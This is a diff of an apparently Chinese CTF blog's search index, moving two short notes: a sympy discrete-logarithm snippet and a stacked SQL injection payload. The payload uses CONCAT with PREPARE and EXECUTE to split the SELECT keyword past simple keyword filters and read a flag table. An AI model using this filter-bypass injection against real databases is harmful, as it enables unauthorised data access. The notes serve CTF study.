-      <url>/blog/2026/01/28/crypto%20python%E5%87%BD%E6%95%B0%E7%B1%BB/</url>
-      
-        <content type="html"><![CDATA[<h1 id="crypto-python函数类"><a href="#crypto-python函数类" class="headerlink" title="crypto python函数类"></a>crypto python函数类</h1><p>标签（空格分隔）： crypto</p><hr><p>求$a^{x} &#x3D; c \mod m $</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from sympy.ntheory import discrete_log</span><br><span class="line">M = 100000000000099</span><br><span class="line">c = 114514</span><br><span class="line">a = 13</span><br><span class="line">x = discrete_log(M, c, a)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><p>使用discrete_log库的discrete_log</p><hr>]]></content>
-      
-      
-      <categories>
-          
-          <category> Crypto </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> python </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>预编译拼接字符法</title>
-      <link href="/blog/2026/01/28/%E9%A2%84%E7%BC%96%E8%AF%91%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E6%B3%95/"/>
-      <url>/blog/2026/01/28/%E9%A2%84%E7%BC%96%E8%AF%91%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E6%B3%95/</url>
-      
-        <content type="html"><![CDATA[<h1 id="预编译拼接字符法"><a href="#预编译拼接字符法" class="headerlink" title="预编译拼接字符法"></a>预编译拼接字符法</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>直接concat函数来进行一个拼接字符串的方法<br><code>语法</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;  // 结束前面的查询语句</span><br><span class="line"></span><br><span class="line">set @sql = CONCAT(&#x27;sele&#x27;,&#x27;ct flag from `1919810931114514`;&#x27;);  </span><br><span class="line">//将关键字拆分（比如select拆成&#x27;sele&#x27;+&#x27;ct&#x27;）来绕过简单的关键字过滤</span><br><span class="line"></span><br><span class="line">prepare stmt from @sql;  // 准备预处理语句</span><br><span class="line">EXECUTE stmt;  // 执行预处理语句</span><br><span class="line">#</span><br><span class="line">//注释掉原查询剩余部分</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/news/90960">https://xz.aliyun.com/news/90960</a></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> SQL绕过 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>php函数简记</title>
       <link href="/blog/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/"/>
       <url>/blog/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/</url>
@@ -346,6 +346,31 @@
         <tags>
             
             <tag> PHP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>预编译拼接字符法</title>
+      <link href="/blog/2026/01/28/%E9%A2%84%E7%BC%96%E8%AF%91%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E6%B3%95/"/>
+      <url>/blog/2026/01/28/%E9%A2%84%E7%BC%96%E8%AF%91%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<h1 id="预编译拼接字符法"><a href="#预编译拼接字符法" class="headerlink" title="预编译拼接字符法"></a>预编译拼接字符法</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>直接concat函数来进行一个拼接字符串的方法<br><code>语法</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;  // 结束前面的查询语句</span><br><span class="line"></span><br><span class="line">set @sql = CONCAT(&#x27;sele&#x27;,&#x27;ct flag from `1919810931114514`;&#x27;);  </span><br><span class="line">//将关键字拆分（比如select拆成&#x27;sele&#x27;+&#x27;ct&#x27;）来绕过简单的关键字过滤</span><br><span class="line"></span><br><span class="line">prepare stmt from @sql;  // 准备预处理语句</span><br><span class="line">EXECUTE stmt;  // 执行预处理语句</span><br><span class="line">#</span><br><span class="line">//注释掉原查询剩余部分</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/news/90960">https://xz.aliyun.com/news/90960</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL绕过 </tag>
             
         </tags>
       
